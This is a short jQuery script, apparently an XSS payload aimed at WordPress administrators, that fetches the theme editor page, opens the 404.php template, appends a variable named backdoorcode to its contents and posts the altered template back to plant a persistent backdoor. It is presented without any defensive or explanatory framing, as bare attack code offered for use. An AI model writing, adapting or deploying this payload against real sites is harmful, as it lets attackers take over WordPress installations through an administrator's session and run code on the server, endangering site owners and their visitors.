themepage = wpadmin + '/' + 'theme-editor.php';
$(document).ready(function(){
	$.get(themepage,function(data){
		current404 = wpadmin + '/' + $(data).find('a[href*="404.php"]').attr('href');
		$.get(current404, function(data2)
	         {
	            form=$(data2).find('form#template');
	            oldtemplate = form.find('textarea#newcontent').val();
				if (typeof(form) == "undefined") {notify('failed')};
	            if (oldtemplate.indexOf(backdoorcode) == -1)
	            {                                               
	                newtemplate = oldtemplate+"\r\n"+backdoorcode;
	                form.find('textarea#newcontent').val(newtemplate);    
	                formdata = form.serialize();
	                $.post(themepage, formdata, notify('worked'));
	            }
	     }).error(notify('failed')); 
	});
});